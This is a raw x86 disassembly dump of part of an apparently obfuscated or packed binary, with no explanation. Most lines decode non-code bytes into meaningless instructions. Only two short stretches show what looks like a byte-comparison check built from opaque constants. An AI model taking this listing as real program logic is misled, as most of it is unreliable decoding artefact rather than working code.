  410c8c:	pusha  
  410c8d:	mul    dl
  410c8f:	jl     0x410d02
  410c91:	loopne 0x410c3a
  410c93:	lods   eax,DWORD PTR ds:[esi]
  410c94:	add    eax,0xce6b44a0
  410c99:	dec    edi
  410c9a:	sbb    eax,0x122d7fd9
  410c9f:	test   al,0xc5
  410ca1:	add    BYTE PTR [edi],ch
  410ca3:	sub    eax,0xb85d75d8
  410ca8:	scas   al,BYTE PTR es:[edi]
  410ca9:	(bad)  [ebx+0x46464de0]
  410caf:	fwait
  410cb0:	sahf   
  410cb1:	in     eax,0xed
  410cb3:	xor    eax,0x2189e8db
  410cb8:	xchg   ch,dl
  410cba:	xlat   BYTE PTR es:[ebx]
  410cbc:	jge    0x410ca6
  410cbe:	mov    ds:0xc9faccf8,eax
  410cc3:	fwait
  410cc4:	and    cl,bl
  410cc6:	arpl   WORD PTR [ebp+0x45620d48],bx
  410ccc:	ins    DWORD PTR es:[edi],dx
  410ccd:	jns    0x410cdc
  410ccf:	push   ebx
  410cd0:	or     dl,BYTE PTR [ebx-0x5ec01717]
  410cd6:	xor    cl,ch
  410cd8:	mov    esi,0x880d4ff1
  410cdd:	leave  
  410cde:	scas   al,BYTE PTR es:[edi]
  410cdf:	call   0xadc2b327
  410ce4:	pop    ss
  410ce5:	fmul   DWORD PTR [ebx+0x34ff12a2]
  410ceb:	fstp   QWORD PTR ds:0x2273d9d9
  410cf1:	ins    BYTE PTR es:[edi],dx
  410cf2:	mov    WORD PTR [ebx+edx*4-0x3f],gs
  410cf6:	inc    edx
  410cf7:	retf   0x4ac6
  410cfa:	pop    ecx
  410cfb:	pop    es
  410cfc:	ret    
  410cfd:	jbe    0x410cf5
  410cff:	jmpw   0x40d4
  410d03:	ror    BYTE PTR [ebp-0xe742a96],1
  410d09:	jge    0x410d17
  410d0b:	push   0xffffff89
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x47ef419c
  410d25:	mov    esp,0x7e7eb8eb
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d81
  410d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d30:	mov    edx,eax
  410d32:	inc    esi
  410d33:	pop    edi
  410d34:	cmp    eax,DWORD PTR [edx-0x14959904]
  410d3a:	xor    eax,DWORD PTR [ecx+0x64683e12]
  410d40:	xlat   BYTE PTR ds:[ebx]
  410d41:	xchg   ecx,eax
  410d42:	not    BYTE PTR [eax-0x3d]
  410d45:	mov    ds:0xa8110236,eax
  410d4a:	lea    edi,[esi+0x76]
  410d4d:	push   es
  410d4e:	jmp    0x410cff
  410d50:	push   esp
  410d51:	lods   al,BYTE PTR ds:[esi]
  410d52:	repnz mov edi,0x74be8a1e
  410d58:	in     al,dx
  410d59:	xchg   edi,eax
  410d5a:	adc    eax,0x186e8fd0
  410d5f:	xor    bl,cl
  410d61:	or     DWORD PTR [ebp+0x6f],eax
  410d64:	mov    ds:0x680298e3,eax
  410d69:	mov    BYTE PTR [edi+0x8],ch
  410d6c:	jo     0x410d86
  410d6e:	push   cs
  410d6f:	mov    dh,0x46
  410d71:	jns    0x410dad
  410d73:	sti    
  410d74:	push   ebx
  410d75:	pop    ecx
  410d76:	mov    ds:0xe3469b8d,eax
  410d7b:	lahf   
  410d7c:	adc    DWORD PTR [edi],0x423e1fc8
  410d82:	ja     0x410d4e
  410d84:	shl    BYTE PTR [ebx-0x1e],1
  410d87:	aad    0xb0
  410d89:	fsubp  st(6),st
  410d8b:	enter  0x517c,0xfe
  410d8f:	dec    eax
  410d90:	adc    ch,BYTE PTR [edi]
  410d92:	lods   eax,DWORD PTR ds:[esi]
  410d93:	test   ebx,ecx
  410d95:	loope  0x410d4b
  410d97:	xor    ecx,edi
  410d99:	int3   
  410d9a:	hlt    
  410d9b:	cli    
  410d9c:	outs   dx,BYTE PTR ds:[esi]
  410d9d:	sub    DWORD PTR [edx+0x50478c19],esi
  410da3:	dec    edi
  410da4:	and    edx,ebp
  410da6:	nop
  410da7:	sbb    DWORD PTR [ebx+ebx*8-0x71],esp
  410dab:	sub    DWORD PTR [ebp-0x4c],edi
  410dae:	mov    bl,0xc0
  410db0:	inc    edi
  410db1:	jb     0x410d99
  410db3:	test   eax,0xa20d0cd0
  410db8:	fisubr DWORD PTR [ecx+0x3dc17de3]
  410dbe:	pop    ebx
  410dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dc0:	jecxz  0x410d6a
  410dc2:	xchg   edx,eax
  410dc3:	dec    eax
  410dc4:	loopne 0x410de3
  410dc6:	bound  eax,QWORD PTR [edx-0x70]
  410dc9:	pusha  
  410dca:	(bad)  
  410dcb:	jns    0x410e14
  410dcd:	shl    cl,cl
  410dcf:	pushf  
  410dd0:	mov    edx,0x6df5ce66
  410dd5:	fwait
  410dd6:	xor    ah,BYTE PTR [ecx]
  410dd8:	jmp    0x2d0ec30f
  410ddd:	pop    edx
  410dde:	cs pop ebp
  410de0:	push   esi
  410de1:	je     0x410d96
  410de3:	cmp    BYTE PTR [edx+edi*1],bl
  410de6:	inc    ebx
  410de7:	cmp    al,0xbf
  410de9:	mov    al,BYTE PTR [eax]
  410deb:	mov    bh,0x2f
  410ded:	and    ecx,esi
  410def:	mov    ds:0x377b614b,al
  410df4:	jae    0x410e0e
  410df6:	frstor [edx+edx*1-0x647c0fe4]
  410dfd:	repnz pop ecx
  410dff:	fimul  WORD PTR [edx+0x3f]
  410e02:	retf   0x4be3
  410e05:	sub    eax,0x3a
  410e08:	push   DWORD PTR [ebp+0x84cb0b4]
  410e0e:	mov    edx,DWORD PTR [ebp-0x16]
  410e11:	xchg   ebx,eax
  410e12:	xor    ah,BYTE PTR [esi-0x34]
  410e15:	push   edx
  410e16:	in     al,0xe9
  410e18:	loope  0x410e91
  410e1a:	jp     0x410e75
  410e1c:	jp     0x410e4f
  410e1e:	mov    eax,db7
  410e21:	pop    ecx
  410e22:	or     DWORD PTR [ecx+ebx*8],edi
  410e25:	pop    ecx
  410e26:	and    dh,dl
  410e28:	in     al,0xda
  410e2a:	cmc    
  410e2b:	(bad)
  410e2e:	pop    esi
  410e2f:	or     al,0x2
  410e31:	sar    BYTE PTR [ebx-0x39],1
  410e34:	push   edx
  410e35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e36:	jmp    0xedf8:0xa5363fc0
  410e3d:	jl     0x410deb
  410e3f:	ss (bad) 
  410e41:	adc    esp,DWORD PTR [esi]
  410e43:	pushf  
  410e44:	sub    eax,0xdc5875b8
  410e49:	and    DWORD PTR [edx],esi
  410e4b:	push   edx
  410e4c:	xor    eax,0xfc56967d
  410e51:	push   esp
  410e52:	(bad)
  410e56:	pusha  
  410e57:	in     eax,dx
  410e58:	mov    bl,0x98
  410e5a:	inc    eax
  410e5b:	ret    
  410e5c:	pusha  
  410e5d:	jno    0x410e18
  410e5f:	repnz mov dl,0xa8
  410e62:	sti    
  410e63:	cld    
  410e64:	push   0xffffffef
  410e66:	sbb    bh,dh
  410e68:	out    0xe6,al
  410e6a:	adc    esi,DWORD PTR [ebx]
  410e6c:	xchg   ebp,eax
  410e6d:	mov    bl,BYTE PTR [esi]
  410e6f:	or     al,0x2c
  410e71:	daa    
  410e72:	jp     0x410e04
  410e74:	aad    0x99
  410e76:	xchg   ebp,esp
  410e78:	sub    cl,0xef
  410e7b:	outs   dx,BYTE PTR ds:[esi]
  410e7c:	pop    esi
  410e7d:	pop    ecx
  410e7e:	jo     0x410eca
  410e80:	mov    dh,BYTE PTR [esi-0x47a58bb1]
  410e86:	xchg   edx,eax
  410e87:	and    BYTE PTR [esi],0x38
  410e8a:	test   al,0x97
  410e8c:	sbb    dl,BYTE PTR [esi]
  410e8e:	cmp    BYTE PTR [esi+0x5681d31f],cl
  410e94:	loopne 0x410e51
  410e96:	xlat   BYTE PTR es:[ebx]
  410e98:	in     eax,0xe4
  410e9a:	pop    ds
  410e9b:	xor    al,0xb6
  410e9d:	out    dx,eax
  410e9e:	mov    cl,BYTE PTR [ecx-0x67]
  410ea1:	mov    dh,0x9d
  410ea3:	sar    cl,cl
  410ea5:	cmp    cl,BYTE PTR [esi-0x7c5dab52]
  410eab:	cld    
  410eac:	ins    DWORD PTR es:[edi],dx
  410ead:	stos   BYTE PTR es:[edi],al
  410eae:	in     al,0x7e
  410eb0:	retf   
  410eb1:	inc    ecx
  410eb2:	and    esp,DWORD PTR [edx-0x3bea8b33]
  410eb8:	neg    BYTE PTR [edi-0x67de66e2]
  410ebe:	pop    esi
  410ebf:	jge    0x410f11
  410ec1:	(bad)  [edi]
  410ec3:	xchg   ebp,eax
  410ec4:	ret    
  410ec5:	icebp  
  410ec6:	jns    0x410ecb
  410ec8:	inc    ebp
  410ec9:	jl     0x410f22
  410ecb:	int    0x5c
  410ecd:	ret    
  410ece:	sub    DWORD PTR [ecx],edx
  410ed0:	nop
  410ed1:	jmp    0x7d85:0x2d34328
  410ed8:	mov    ebp,0xae99529e
  410edd:	mov    ch,BYTE PTR [edx+0x5774e2e5]
  410ee3:	add    al,0x3f
  410ee5:	push   edi
  410ee6:	(bad)  
  410ee7:	cld    
  410ee8:	jmp    0x410eb5
  410eea:	fadd   st,st(7)
  410eec:	fistp  DWORD PTR [ebx]
  410eee:	outs   dx,BYTE PTR ds:[esi]
  410eef:	xor    ecx,edi
  410ef1:	mov    bl,0x5a
  410ef3:	and    esp,DWORD PTR [ebp-0x53]
  410ef6:	ja     0x410f00
  410ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ef9:	push   esi
  410efa:	retf   
  410efb:	mov    dh,0x7a
  410efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410efe:	ins    DWORD PTR es:[edi],dx
  410eff:	aas    
  410f00:	stos   BYTE PTR es:[edi],al
  410f01:	adc    BYTE PTR [eax],ch
  410f03:	out    0x29,al
  410f05:	adc    al,0x92
  410f07:	mov    al,0xed
  410f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f0a:	cmc    
  410f0b:	and    cl,0x95
  410f0e:	gs inc eax
  410f10:	rol    esi,0x37
  410f13:	das    
  410f14:	add    eax,0x9958eb15
  410f19:	dec    esi
  410f1a:	imul   esi,DWORD PTR [eax+0x68de211b],0x3d
  410f21:	jl     0x410ed8
  410f23:	jb     0x410edd
  410f25:	fadd   QWORD PTR [ebp+0x3b]
  410f28:	(bad)  
  410f29:	add    edi,DWORD PTR cs:[edx+0x5bb81872]
  410f30:	mov    ebx,0x55396bbf
  410f35:	ret    0x9ea9
  410f38:	pop    eax
  410f39:	loopne 0x410f13
  410f3b:	sub    eax,0x727353bd
  410f40:	jge    0x410f8b
  410f42:	lods   eax,DWORD PTR ds:[esi]
  410f43:	dec    dx
  410f45:	fwait
  410f46:	xchg   ecx,eax
  410f47:	and    BYTE PTR [eax-0x29f692fa],0x93
  410f4e:	pop    ds
  410f4f:	jae    0x410f27
  410f51:	cld    
  410f52:	mov    ebp,0x21709289
  410f57:	sub    DWORD PTR [ebp+0x5bc5a064],edx
  410f5d:	add    BYTE PTR [ebp+0x2a],bl
  410f60:	add    al,0xc0
  410f62:	fld    TBYTE PTR [ecx-0x57]
  410f65:	fdivr  st(1),st
  410f67:	add    ebp,DWORD PTR [eax-0x7e]
  410f6a:	xchg   ebx,eax
  410f6b:	inc    edi
  410f6c:	int3   
  410f6d:	imul   esp,DWORD PTR [ebx+0x42],0xa
  410f71:	repnz push edi
  410f73:	(bad)  
  410f74:	sub    BYTE PTR [ecx-0x6f5594e8],bh
  410f7a:	sbb    edi,DWORD PTR [ecx-0x51c2ac5c]
  410f80:	ss add eax,0x78d52004
  410f86:	jb     0x410f54
  410f88:	dec    ebp
  410f89:	cs adc eax,ecx
  410f8c:	hlt    
  410f8d:	xor    bl,BYTE PTR [esi+0x183ca7ac]
  410f93:	test   edx,edi
  410f95:	mov    bl,0xca
  410f97:	lahf   
  410f98:	rol    DWORD PTR [edi],0x5d
  410f9b:	jnp    0x410fcc
  410f9d:	cmp    ecx,DWORD PTR [edi]
  410f9f:	push   esi
  410fa0:	fst    DWORD PTR [ecx-0x35]
  410fa3:	pop    es
  410fa4:	sbb    esp,DWORD PTR [ecx]
  410fa6:	nop
  410fa7:	jmp    0xa07accb2
  410fac:	in     al,dx
  410fad:	call   0xfa91:0x20c2b339
  410fb4:	stos   DWORD PTR es:[edi],eax
  410fb5:	test   BYTE PTR [eax],ah
  410fb7:	xor    BYTE PTR [edx+0x43],bh
  410fba:	cwde   
  410fbb:	and    DWORD PTR [edi-0x16],0xffffffd7
  410fbf:	fimul  WORD PTR [ecx]
  410fc1:	hlt    
  410fc2:	in     eax,dx
  410fc3:	pop    ecx
  410fc4:	sti    
  410fc5:	mov    dl,0x63
  410fc7:	xchg   ebx,eax
  410fc8:	aaa    
  410fc9:	dec    esi
  410fca:	mov    esp,0xeaddffce
  410fcf:	jmp    0x410f6f
  410fd1:	je     0x410fc8
  410fd3:	jmp    0x410fe5
  410fd5:	addr16 loope 0x41100e
  410fd8:	or     ah,BYTE PTR [esi-0x5c5c8738]
  410fde:	cld    
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fd9
  41102b:	lahf   
  41102c:	pusha  
  41102d:	inc    ecx
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x410fe0
  411037:	mov    ds:0x73d8fe1f,al
  41103c:	mov    WORD PTR [esi-0x69],gs
  41103f:	sti    
  411040:	jbe    0x411039
  411042:	pushf  
  411043:	repnz pop eax
  411045:	repz add al,BYTE PTR [eax+0x4b]
  411049:	in     eax,0x22
  41104b:	jecxz  0x411046
  41104d:	push   ss
  41104e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  411050:	push   ebp
  411051:	jl     0x410ff6
  411053:	dec    edx
  411054:	adc    eax,0xc4cfc984
  411059:	xchg   ch,ah
  41105b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41105c:	stos   BYTE PTR es:[edi],al
  41105d:	mov    ds,edi
  41105f:	xchg   esi,eax
  411060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411061:	iret   
  411062:	dec    esp
  411063:	inc    ecx
  411064:	lods   eax,DWORD PTR ds:[esi]
  411065:	mov    al,ds:0x3cbb03ac
  41106a:	outs   dx,BYTE PTR ds:[esi]
  41106b:	xor    BYTE PTR [edx],ch
  41106d:	jmp    0x7bdd3c23
  411072:	xlat   BYTE PTR ds:[ebx]
  411073:	clc    
  411074:	push   cs
  411075:	(bad)  
  411076:	push   ebp
  411077:	dec    esi
  411078:	dec    ebp
  411079:	sub    ch,BYTE PTR [esi]
  41107b:	jecxz  0x4110c4
  41107d:	push   ss
  41107e:	sbb    dh,BYTE PTR [ebp-0x49]
  411081:	pop    edi
  411082:	mov    eax,0xc2f07fe4
  411087:	aad    0xa
  411089:	mov    al,0x4f
  41108b:	ja     0x411040
  41108d:	pop    ebp
  41108e:	xor    ecx,eax
  411090:	test   BYTE PTR [ebx+0x23],0x19
  411094:	jno    0x411107
  411096:	loop   0x411056
  411098:	xchg   DWORD PTR [bx+si-0x3a],esp
  41109c:	sbb    DWORD PTR [edi-0x268b9f5c],0x10908d30
  4110a6:	outs   dx,DWORD PTR ds:[esi]
  4110a7:	dec    eax
  4110a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110a9:	psubsw mm4,QWORD PTR [edi]
  4110ac:	and    al,0x5c
  4110ae:	push   esp
  4110af:	pop    ebx
  4110b0:	push   edi
  4110b1:	mov    bl,0x52
  4110b3:	int3   
  4110b4:	xchg   ecx,eax
  4110b5:	mov    DWORD PTR [esi+0x60],ebx
  4110b8:	pop    esp
  4110b9:	xchg   ecx,eax
  4110ba:	sbb    ebx,esi
  4110bc:	mov    eax,0x8bea5319
  4110c1:	push   ebp
  4110c2:	jmp    0x7d27:0x5d671b6
  4110c9:	xor    al,0xc2
  4110cb:	cmp    DWORD PTR [ebx-0x45],esp
  4110ce:	pop    ds
  4110cf:	adc    DWORD PTR [ebx+edx*8+0x14],ebp
  4110d3:	ss repnz stc 
  4110d6:	out    0x4,eax
  4110d8:	jns    0x411091
  4110da:	outs   dx,BYTE PTR ds:[esi]
  4110db:	ror    DWORD PTR [eax+edx*8+0x3d4c32c],cl
  4110e2:	ret    
  4110e3:	test   eax,0x464b8a2b
  4110e8:	jg     0x4110d1
  4110ea:	sahf   
  4110eb:	cmpxchg DWORD PTR [eax+0x7c],edi
  4110ef:	addr16 jg 0x41107e
  4110f2:	push   es
  4110f3:	jle    0x41112b
  4110f5:	adc    esi,DWORD PTR [ebx]
  4110f7:	add    bl,ch
  4110f9:	stc    
  4110fa:	fcmovu st,st(2)
  4110fc:	outs   dx,BYTE PTR ds:[esi]
  4110fd:	xchg   edx,eax
  4110fe:	aaa    
  4110ff:	fcomp  DWORD PTR [edi+0x50]
  411102:	ret    
  411103:	and    eax,0x3d777367
  411108:	in     eax,dx
  411109:	lods   eax,DWORD PTR fs:[esi]
  41110b:	pop    edx
  41110c:	mov    fs,WORD PTR [edi]
  41110e:	mov    ah,0x24
  411110:	cmp    al,0x24
  411112:	jmp    0x632c8f69
  411117:	stc    
  411118:	inc    eax
  411119:	xchg   esp,eax
  41111a:	dec    ebp
  41111b:	cmp    edi,DWORD PTR [esi]
  41111d:	(bad)  
  41111e:	jle    0x41112f
  411120:	and    al,0x7e
  411122:	loope  0x411194
  411124:	mov    ebx,DWORD PTR [eax+ebp*4]
  411127:	into   
  411128:	and    al,0x50
  41112a:	je     0x41119f
  41112c:	sbb    al,0x2b
  41112e:	nop
  41112f:	xor    eax,0xa21a83c3
  411134:	dec    esp
  411135:	add    BYTE PTR [esi+0x59],bh
  411138:	and    dh,BYTE PTR [esi+esi*2-0x764c5c85]
  41113f:	cli    
  411140:	ja     0x41118a
  411142:	xchg   DWORD PTR [esi],edi
  411144:	and    eax,0xdf7b51a4
  411149:	imul   edx,DWORD PTR ds:0xa89e6811,0x3c8d5971
  411153:	(bad)  
  411154:	jecxz  0x411164
  411156:	shl    BYTE PTR [ecx+eax*4],cl
  411159:	mov    ebx,0xe0823e30
  41115e:	mov    WORD PTR [edi],?
  411160:	test   cl,ah
  411162:	loope  0x4110ea
  411164:	out    0x69,eax
  411166:	xchg   ch,ch
  411168:	cmp    eax,0x414ce9d1
  41116d:	je     0x411113
  41116f:	xchg   ecx,eax
  411170:	call   0xe40:0xbb4c9dec
  411177:	iret   
  411178:	into   
  411179:	add    DWORD PTR [ebp+ebx*2+0x1bd81434],edx
  411180:	loop   0x411131
  411182:	jmp    0x2c133f2d
  411187:	lds    ebx,FWORD PTR [eax]
  411189:	mov    cl,0x7f
  41118b:	xchg   ebx,eax
  41118c:	jecxz  0x4111a2
  41118e:	push   esp
  41118f:	mov    ah,0x0
  411191:	out    0x6,eax
  411193:	fldcw  WORD PTR [eax-0x79]
  411196:	mov    dl,0x4a
  411198:	cs mov eax,0x3230c83e
  41119e:	mov    ebp,DWORD PTR [ecx-0x4a178af0]
  4111a4:	add    ecx,DWORD PTR [edx+0x404432c0]
  4111aa:	mov    al,ds:0xed7917c7
  4111af:	inc    ebp
  4111b0:	sti    
  4111b1:	int    0x4e
  4111b3:	xor    DWORD PTR [ecx+0x4b7bb73c],ebp
  4111b9:	ror    BYTE PTR [esi+0x36a16329],0x91
  4111c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111c1:	ds test DWORD PTR fs:[edx+eiz*8+0x1b],edx
  4111c7:	out    dx,al
  4111c8:	(bad)  
  4111c9:	loopne 0x411218
  4111cb:	and    ch,BYTE PTR [ebp+0x1b]
  4111ce:	popa   
  4111cf:	inc    edx
  4111d0:	pushf  
  4111d1:	and    BYTE PTR [eax],dl
  4111d3:	mov    dh,0x7b
  4111d5:	imul   edi,edi,0xffffffd7
  4111d8:	adc    esp,DWORD PTR [esi-0x651153bf]
  4111de:	jo     0x411175
  4111e0:	pop    ebx
  4111e1:	push   ss
  4111e2:	aam    0x11
  4111e4:	stos   BYTE PTR es:[edi],al
  4111e5:	sbb    BYTE PTR [ebx+0x54],ch
  4111e8:	sbb    al,0xaa
  4111ea:	je     0x411224
  4111ec:	into   
  4111ed:	cs test al,0x80
  4111f0:	call   0xf311:0xb0b8ff97
  4111f7:	(bad)  
  4111f8:	and    al,0x46
  4111fa:	jo     0x4111da
  4111fc:	lock mov ah,0x5c
  4111ff:	nop
  411200:	outs   dx,BYTE PTR ds:[esi]
  411201:	lock fisttp QWORD PTR [ecx-0x8c1cab9]
  411208:	icebp  
  411209:	test   eax,0x7f90f0ef
  41120e:	sbb    al,0xd1
  411210:	dec    esp
  411211:	les    ebx,FWORD PTR [edx+0x29]
  411214:	mov    eax,ds:0x14271bb
  411219:	bound  esi,QWORD PTR [ebp+edx*1-0x2f26d252]
  411220:	bound  ebx,QWORD PTR [ebx+0x54]
  411223:	inc    ebp
  411224:	cmp    eax,ebp
  411226:	xlat   BYTE PTR ds:[ebx]
  411227:	mov    al,ds:0xf18ddf42
  41122c:	add    ebx,ecx
  41122e:	cs mov bh,0x5b
  411231:	pop    ds
  411232:	popa   
  411233:	aad    0xf
  411235:	loope  0x411254
  411237:	sbb    dh,BYTE PTR [edi-0x72]
  41123a:	div    BYTE PTR [ebx+ebx*4+0x5efe2a06]
  411241:	cmp    BYTE PTR [ebx-0x6a],dh
  411244:	add    BYTE PTR ds:0x1162b5b1,0x8c
  41124b:	outs   dx,DWORD PTR ds:[esi]
  41124c:	icebp  
  41124d:	fcom   QWORD PTR [eax]
  41124f:	cs dec eax
  411251:	popf   
  411252:	push   ebp
  411253:	mov    ecx,0x3732212c
  411258:	mov    al,ds:0x7d07c8d1
  41125d:	popf   
  41125e:	mov    ds:0xf48a5f23,al
  411263:	add    esi,ecx
  411265:	stc    
  411266:	sbb    al,0xde
  411268:	aas    
  411269:	xchg   edi,eax
  41126a:	push   ebp
  41126b:	lahf   
  41126c:	out    0x58,eax
  41126e:	push   es
  41126f:	pusha  
  411270:	loop   0x4112ad
  411272:	inc    edi
  411273:	loope  0x4112b6
  411275:	mov    al,0x29
  411277:	and    esp,ebp
  411279:	xchg   ebp,eax
  41127a:	dec    ecx
  41127b:	rol    BYTE PTR [eax],1
  41127d:	cmp    DWORD PTR [eax+0x45716aac],ebx
  411283:	enter  0x7fb8,0xcb
  411287:	frstor ds:0xffe62692
  41128d:	pushf  
  41128e:	mov    eax,0x79bbbc18
  411293:	out    dx,al
  411294:	shl    eax,cl
  411296:	nop
  411297:	into   
  411298:	mov    esi,0xd912d15
  41129d:	nop
  41129e:	sub    ch,BYTE PTR [esi]
  4112a0:	(bad)  
  4112a2:	dec    eax
  4112a3:	and    edx,DWORD PTR [edi+ebp*4]
  4112a6:	call   0x97abda7f
  4112ab:	(bad)
  4112ae:	retf   0x8fc3
  4112b1:	pop    ebp
  4112b2:	jae    0x4112d0
  4112b4:	and    ebx,DWORD PTR [eax+0x71]
  4112b7:	mov    edi,DWORD PTR [ecx]
  4112b9:	jle    0x4112a5
  4112bb:	adc    dh,bl
  4112bd:	and    eax,0x880d13d3
  4112c2:	pop    DWORD PTR [eax]
  4112c4:	mov    eax,0x746f22ba
  4112c9:	ins    DWORD PTR es:[edi],dx
  4112ca:	test   al,0x9a
  4112cc:	sub    ecx,0xffffffe6
  4112cf:	and    ebx,DWORD PTR [ecx]
  4112d1:	aad    0x70
  4112d3:	add    edi,DWORD PTR [edi+0x62898562]
  4112d9:	push   edi
  4112da:	cmp    ebx,DWORD PTR [edx-0x277110ed]
  4112e0:	fsubp  st(5),st
  4112e2:	mov    WORD PTR [eax+ebp*1-0x7bf08b67],es
  4112e9:	inc    BYTE PTR [edx]
  4112eb:	add    BYTE PTR [eax],al
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x1368f61e,eax
  411318:	cmp    ecx,DWORD PTR [esi+0x25]
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x4112ef
  411324:	jmp    0x4112d5
  411326:	cwde   
  411327:	shl    DWORD PTR [edi+0x15b6e940],cl
  41132d:	mov    eax,ds:0xfbf1904
  411332:	repz iret 
  411334:	dec    esp
  411335:	or     ebp,DWORD PTR [ecx]
  411337:	fyl2x  
  411339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41133a:	add    ebp,DWORD PTR [eax]
  41133c:	dec    esp
  41133d:	sbb    bh,bh
  41133f:	jl     0x4113b2
  411341:	js     0x411349
  411343:	adc    al,0x6a
  411345:	sbb    eax,0x299eea17
  41134a:	pop    ebp
  41134b:	leave  
  41134c:	and    DWORD PTR [ebx],ebx
  41134e:	test   eax,0xd648b12e
  411353:	hlt    
  411354:	fild   QWORD PTR [ecx+0x44]
  411357:	aad    0xfe
  411359:	push   edi
  41135a:	test   eax,0xb8566682
  41135f:	and    DWORD PTR [edi+0x522ce3e8],edi
  411365:	jecxz  0x4113c9
  411367:	fadd   st,st(5)
  411369:	mov    ecx,esi
  41136b:	and    cl,BYTE PTR [esi-0x79]
  41136e:	daa    
  41136f:	mov    cl,0xfa
  411371:	loop   0x411383
  411373:	aad    0xa3
  411375:	(bad)  
  411376:	xor    al,dh
  411378:	push   ecx
  411379:	fwait
  41137a:	mov    ds:0x92569d1d,eax
  41137f:	fld    QWORD PTR [ebx]
  411381:	adc    eax,0x91898542
  411386:	mov    bl,BYTE PTR [edx+0x728ef2e8]
  41138c:	pop    ss
  41138d:	imul   esi,DWORD PTR [ebx-0x3f],0xffffffa5
  411391:	mov    edx,0xc541fe6b
  411396:	popf   
  411397:	add    DWORD PTR [ecx-0x79],edx
  41139a:	fdivr  DWORD PTR [eax+0x35]
  41139d:	retf   
  41139e:	outs   dx,DWORD PTR ds:[esi]
  41139f:	pop    ebx
  4113a0:	loope  0x411410
  4113a2:	ja     0x4113c5
  4113a4:	dec    esp
  4113a5:	lahf   
  4113a6:	hlt    
  4113a7:	sub    bh,BYTE PTR [ebx-0xa5d9aa3]
  4113ad:	in     al,0xdd
  4113af:	call   0xa339e48d
  4113b4:	xlat   BYTE PTR ds:[ebx]
  4113b5:	sub    eax,0x2b75f8f4
  4113ba:	ja     0x4113fc
  4113bc:	aaa    
  4113bd:	fcom   st(2)
  4113bf:	mov    gs,WORD PTR [edi+0x65]
  4113c2:	pop    es
  4113c3:	jns    0x41141e
  4113c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113c6:	xchg   ch,al
  4113c8:	sbb    ecx,DWORD PTR [ecx-0x72bfda64]
  4113ce:	fnstenv [eax+edi*8+0x3ca4a0c8]
  4113d5:	hlt    
  4113d6:	jae    0x411424
  4113d8:	mov    cl,0x63
  4113da:	push   ebp
  4113db:	cli    
  4113dc:	jae    0x41138d
  4113de:	jo     0x411375
  4113e0:	loop   0x4113ff
  4113e2:	scas   eax,DWORD PTR es:[edi]
  4113e3:	xor    edx,DWORD PTR [ebx]
  4113e5:	push   ds
  4113e6:	shl    ecx,1
  4113e8:	stos   DWORD PTR es:[edi],eax
  4113e9:	dec    esi
  4113ea:	push   es
  4113eb:	mov    edi,0x4ca0f844
  4113f0:	ror    DWORD PTR [edi-0x4ac76f03],cl
  4113f6:	push   ds
  4113f7:	dec    esp
  4113f8:	xor    ah,BYTE PTR ds:[ebp-0x7b0dd187]
  4113ff:	xor    ebp,DWORD PTR [esi-0x67]
  411402:	xor    eax,DWORD PTR [ebx]
  411404:	dec    ebx
  411405:	call   0xb9deedff
  41140a:	push   ds
  41140b:	not    eax
  41140d:	inc    ebx
  41140e:	push   ds
  41140f:	inc    esp
  411410:	pop    eax
  411411:	jmp    0xa758b192
  411416:	xchg   esp,eax
